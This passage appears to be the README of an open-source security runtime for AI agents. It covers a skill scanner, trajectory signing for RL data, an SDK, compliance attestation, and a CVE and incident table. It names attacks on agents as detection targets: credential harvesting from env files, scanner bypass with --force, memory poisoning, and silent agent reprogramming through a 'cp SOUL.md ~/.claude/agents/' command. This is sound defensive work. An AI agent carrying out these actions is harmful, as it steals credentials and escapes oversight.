|`~/.hermes/.env` / `auth.json`  |Harvest credentials during session           |T19 CRED_ACCESS    |
|`delegate_task`                 |Spawn undeclared sub-agents outside scope    |T29 A2A            |
|`skills_install --force`        |Bypass the security scanner                  |T30 SUPPLY_CHAIN   |
|`send_message` to new recipients|Fleet coordination / unauthorized broadcast  |T29 A2A            |
|batch runner trajectories       |Unsafe tool calls baked into RL training data|`sign_trajectory()`|

A drop-in `SKILL.md` for hermes is at [`skills/hermes/SKILL.md`](skills/hermes/SKILL.md).

-----

## Skill scanner

`aiglos scan-skill <name>` runs 8 risk signals against any ClawHub, SkillsMP, npm, or PyPI package in under 2 seconds. VirusTotal sees encrypted payloads at rest. Aiglos sees the attack vectors that VirusTotal cannot score:

```bash
aiglos scan-skill solana-wallet-tracker
# [CRITICAL 78/100] DO NOT INSTALL
# social_engineering — "paste in terminal" in README (instructions designed to make users run untrusted code)
# suspicious_permissions — requests shell, credentials, and network simultaneously
# known_malicious_publisher — same account distributed GhostLoader last week
# new_publish_anomaly — 6h old, 0 downloads before this push, suspiciously professional README

aiglos scan-skill memory-manager-pro
# [SAFE 12/100]
# verified_publisher — 847 installs, 14 months active
# permissions_appropriate — read/write memory only, no shell
# no_social_engineering_signals
# no_known_vulnerabilities
```

The 8 signals:

1. `social_engineering` — README language designed to bypass user security judgment
1. `suspicious_permissions` — permission scope inconsistent with declared functionality
1. `known_malicious_publisher` — publisher account history across registries
1. `new_publish_anomaly` — age / download velocity patterns matching supply chain attacks
1. `obfuscated_payload` — encrypted or encoded code downloaded at runtime
1. `typosquatting` — edit distance from popular legitimate packages
1. `dependency_confusion` — private package names published to public registries
1. `known_cve_dependency` — direct dependencies with published CVEs

We scanned 10,700 ClawHub skills. 820 are confirmed malicious. Online scanner: **aiglos.dev/scan**

-----

## RL training data integrity

The RL training surface is one that no existing security tool addresses. If agents are generating training trajectories while operating in a compromised or miscalibrated state, those trajectories carry the compromise into the next model version. Every unsafe tool call that enters the training pipeline trains the model to accept that call as normal agent behavior.

`sign_trajectory()` closes this loop:

```python
from aiglos.integrations.hermes import HermesGuard

guard = HermesGuard(agent_name="hermes-batch", policy="enterprise")

# Process trajectories for RL training
for trajectory in batch_runner.generate(n=1000):
    signed = guard.sign_trajectory(trajectory)
    # signed["_aiglos"]["blocked_calls"]  → trajectories with blocked calls are flagged
    # signed["_aiglos"]["warned_calls"]   → trajectories with warnings are annotated
    # signed["_aiglos"]["signature"]      → HMAC chain for provenance verification

    if signed["_aiglos"]["blocked_calls"] > 0:
        training_pipeline.quarantine(signed)  # don't train on compromised trajectories
    else:
        training_pipeline.enqueue(signed)

# Every trajectory in the pipeline has a signed record of its security state
# at the time of generation. Verifiable downstream. No separate documentation.
```

-----

## CLI

```bash
python -m aiglos help
```

```
aiglos v0.4.0 — AI agent security runtime

ADAPTIVE COMMANDS
  stats                     Rule firing stats across all sessions
  sessions [--n N]          Recent session history
  inspect                   Run all inspection triggers
  run                       Full cycle: inspect + campaign analysis + propose
  amend list                Pending amendment proposals
  amend approve <id>        Approve (accepts id prefix)
  amend reject <id>         Reject
  amend rollback <id>       Roll back an approved amendment
  amend history             All amendments, all statuses
  policy [session-id]       Show derived policy for a session

DETECTION COMMANDS
  check <tool> [args-json]  Inspect a tool call interactively
  scan-skill <n>            Scan a ClawHub or SkillsMP skill

RESEARCH COMMANDS
  autoresearch --category <c> --rounds N [--adversarial]
                            Self-improving rule optimization
  autoresearch --report     Generate NDAA §1513 experiment log

ENVIRONMENT
  AIGLOS_OBS_DB             Observation DB (default: ~/.aiglos/observations.db)
```

-----

## TypeScript SDK

```typescript
import aiglos, { inspectRequest, inspectCommand, createSecureFetch, patchChildProcess } from "aiglos";

// Global attach
aiglos.attach({
  agentName: "my-agent",
  interceptHttp: true,
  allowHttp: ["api.openai.com"],
  interceptSubprocess: true,
  subprocessTier3Mode: "block",
});

// Manual inspection
const r1 = inspectRequest({ method: "POST", url: "https://api.stripe.com/v1/charges" });
// { verdict: "BLOCK", ruleId: "T37" }

const r2 = inspectCommand("cp SOUL.md ~/.claude/agents/SOUL.md");
// { verdict: "BLOCK", ruleId: "T36_AGENTDEF", tier: 3 }

const r3 = inspectCommand("git status");
// { verdict: "ALLOW", tier: 1 }

// Secure fetch wrapper (does not patch globally)
const fetch = createSecureFetch({ allowHttp: ["api.openai.com"] });

// child_process patcher
patchChildProcess({ tier3Mode: "pause" });

const artifact = aiglos.close();
// Full SessionArtifact with HMAC identity chain
```

|Surface      |Rules                                                    |Entry point                               |
|-------------|---------------------------------------------------------|------------------------------------------|
|HTTP / fetch |T19, T20, T22, T25, T34, T35, T36, T37                   |`inspectRequest()` · `createSecureFetch()`|
|child_process|T07, T08, T10, T11, T12, T19, T21, T23, T36_AGENTDEF, T38|`inspectCommand()` · `patchChildProcess()`|
|Session      |HMAC-SHA256 signing, `SessionArtifact`                   |`Session` class                           |

-----

## Attestation

Every session close produces a signed artifact. v0.4.0 structure:

|Field                |Content                                                           |
|---------------------|------------------------------------------------------------------|
|`http_events`        |All HTTP calls with verdicts and HMAC signatures                  |
|`subproc_events`     |All subprocess calls with tier, verdict, compensating transactions|
|`agentdef_violations`|T36_AGENTDEF violations with `semantic_score` and `semantic_risk` |
|`multi_agent`        |Full parent-to-child spawn tree                                   |
|`session_identity`   |HMAC session key header with `public_token`                       |
|`aiglos_version`     |Platform version at attestation time                              |

### NDAA §1513 (deadline: June 16, 2026)

```python
aiglos.attach(agent_name="my-agent", policy="federal")
# Every artifact includes ndaa_1513_ready=True
# RSA-2048 signature on Pro/Enterprise (required for C3PAO submission)
```

The question federal auditors are asking: what did your AI agents execute, in what order, against what systems, and can you prove it? Aiglos generates the artifact that answers that question at every session close. Autoresearch run logs provide the additional audit trail for how the detection capability itself was developed and validated.

### CMMC Level 2 control mapping

|Control|Description                             |Aiglos coverage                         |
|-------|----------------------------------------|----------------------------------------|
|3.3.1  |Create and retain audit logs            |`SessionArtifact` after every cycle     |
|3.3.2  |Individual accountability               |Per-call `AuditRecord` with `agent_name`|
|3.14.2 |Protection from malicious code          |T-class blocking engine                 |
|3.13.1 |Monitor external boundary communications|SSRF/exfil detection                    |
|3.1.1  |Limit system access                     |Policy-gated blocking                   |
|3.1.2  |Limit privileged transactions           |T10 PRIV_ESC + T07 SHELL_INJECT         |
|3.5.1  |Authenticate users and processes        |Session attestation chain               |
|3.13.8 |Cryptographic mechanisms                |HMAC-SHA256 (free) / RSA-2048 (Pro)     |

### EU AI Act Article 15 (deadline: August 2, 2026)

Article 15 requires high-risk AI systems to maintain auditability of AI decisions and technical documentation of AI system behavior. The Aiglos session artifact satisfies the documentation requirement. The adaptive layer’s amendment history satisfies the “ongoing monitoring” requirement.

-----

## CVE coverage

|CVE / Incident           |Attack                                                                                                                 |Rules            |
|-------------------------|-----------------------------------------------------------------------------------------------------------------------|-----------------|
|`CVE-2026-25253` CVSS 8.8|ClawJacked — WebSocket gateway brute-force, one-click RCE via malicious skill                                          |`T01` `T25`      |
|`CVE-2026-24763`         |Command injection via shell tool parameters                                                                            |`T07`            |
|`CVE-2026-25157`         |Path traversal in filesystem tools                                                                                     |`T08`            |
|`CVE-2026-24891`         |SSRF via agent-controlled URL                                                                                          |`T25`            |
|`CVE-2026-25001`         |Credential exfiltration via plaintext agent log                                                                        |`T32` `T01`      |
|`CVE-2026-25089`         |Malicious registry skill auto-execution                                                                                |`T30`            |
|`CVE-2026-24612`         |Persistent memory poisoning via MEMORY.md                                                                              |`T31`            |
|`CVE-2026-25198`         |Agent-to-agent protocol hijacking                                                                                      |`T29`            |
|`CVE-2026-24774`         |OAuth confused deputy via MCP tool auth                                                                                |`T25`            |
|`CVE-2026-25312`         |Heartbeat loop: crafted HEARTBEAT.md triggers unbounded scheduled execution                                            |`T06` `T11`      |
|Incident Mar 2026        |**McKinsey/Lilli** — 46.5M messages, writable system prompts, 40K consultants, 2 hours, machine-speed autonomous       |`T27` `T20` `T06`|
|Incident Mar 2026        |**GhostClaw** — malicious npm live on launch day, AES-encrypted payload, VirusTotal blind                              |`T26` `T30`      |
|Incident Mar 2026        |**agency-agents install vector** — `cp` to `~/.claude/agents/` as silent agent reprogramming                           |`T36_AGENTDEF`   |
|Research Mar 2026        |**Nemotron Super in-context campaign** — 1M context local inference, no API guardrails, single clean-looking exfil call|`T06` `T22` `T27`|
|Research Mar 2026        |**Moltbook A2A** — cross-agent privilege escalation via Agent Card artifacts                                           |`T29`            |

Proof of concept code for every CVE is in `/pocs/`, each with reproduction steps, affected versions, Aiglos detection output, and remediation notes.

-----

## Pricing

|Tier                    |Cost                                             |What’s included                                                                                                                                           |
|------------------------|-------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------|
|**Free / MIT**          |$0 forever                                       |Full T1–T38 detection engine, Python + TypeScript SDKs, adaptive layer, CLI, skill scanner, hermes integration, autoresearch, HMAC-signed artifacts       |
|**Pro**                 |$39 / dev / month                                |Everything in Free + RSA-2048 signed artifacts, cloud threat dashboard, CVE updates pushed automatically, SIEM/webhook integration, CMMC compliance export|
|**Teams**               |$299 / month (up to 10 devs) + $29 / dev above 10|Everything in Pro + centralized policy management, aggregated threat dashboard across fleet, shared allow-lists, Tier 3 approval workflows                |
|**Defense & Government**|Custom, annual                                   |Everything in Teams + on-prem/air-gap deployment, NDAA §1513 / CMMC auto-formatted reports, FedRAMP path, DoD-specific rule packs, dedicated support      |

The detection engine is open source because open source builds trust and drives adoption. The compliance and attestation layer is what funds the research.

-----

## Open source vs. proprietary

|Component                                                                             |License    |
|--------------------------------------------------------------------------------------|-----------|
|T1–T38 detection engine (Python + TypeScript)                                         |MIT        |
|Adaptive layer — ObservationGraph, InspectionEngine, AmendmentEngine, PolicySerializer|MIT        |
|T06 campaign-mode analysis                                                            |MIT        |
|Autoresearch two-loop system + adversarial corpus                                     |MIT        |
|AgentDefGuard with semantic scoring                                                   |MIT        |
|Multi-agent registry and session identity chain                                       |MIT        |
|CLI                                                                                   |MIT        |
|hermes integration + `sign_trajectory()`                                              |MIT        |
|Skill scanner (local)                                                                 |MIT        |
|RSA-2048 signed attestation artifacts                                                 |Proprietary|
|Cloud threat dashboard                                                                |Proprietary|
|NDAA §1513 / CMMC / EU AI Act auto-formatted reports                                  |Proprietary|
|Cross-customer anonymized threat intelligence                                         |Proprietary|
|Air-gap DoD container                                                                 |Proprietary|

-----

## Changelog

**v0.4.0 — March 2026**
Adaptive layer (ObservationGraph, InspectionEngine, AmendmentEngine, PolicySerializer). T06 campaign-mode (6 patterns, AGENTDEF_CHAIN). TypeScript SDK (full T01-T38, createSecureFetch, patchChildProcess, Session). CLI (stats, sessions, inspect, run, amend, policy, autoresearch). Semantic scoring in AgentDefGuard. Policy inheritance. 341 tests.

**v0.3.0 — March 2026**
T36_AGENTDEF, T37 FIN_EXEC, T38 AGENT_SPAWN. AgentDefGuard, SessionIdentityChain, MultiAgentRegistry. Artifact includes agentdef violations, spawn tree, session identity.

**v0.2.0 — February 2026**
HTTP/API and subprocess interception. Three-tier blast radius. Tier 3 pause mode with webhook approval.

**v0.1.1 — March 2026**
Autoresearch loop (Karpathy-inspired). Adversarial corpus co-evolution. NDAA §1513 experiment log output. T06 campaign spec. Protocol-agnostic repositioning.

**v0.1.0 — January 2026**
T1–T36 detection engine. MCP interception. OpenClaw and hermes integrations. 10 CVEs filed. HMAC session artifacts.

-----

## Contributing

```bash
git clone https://github.com/aiglos/aiglos
cd aiglos && pip install -e ".[dev]" && pytest tests/
```

New threat pattern: <CONTRIBUTING.md> · CVE report: <SECURITY.md>

Every CVE filed against any AI agent gets a rule family. If you find an attack pattern Aiglos does not cover, open an issue.

-----

<div align="center">

[aiglos.dev](https://aiglos.dev) · [docs](https://docs.aiglos.dev) · [scanner](https://aiglos.dev/scan) · [defense](https://aiglos.dev/defense) · [discord](https://discord.gg/aiglos) · [security@aiglos.dev](mailto:security@aiglos.dev)

</div>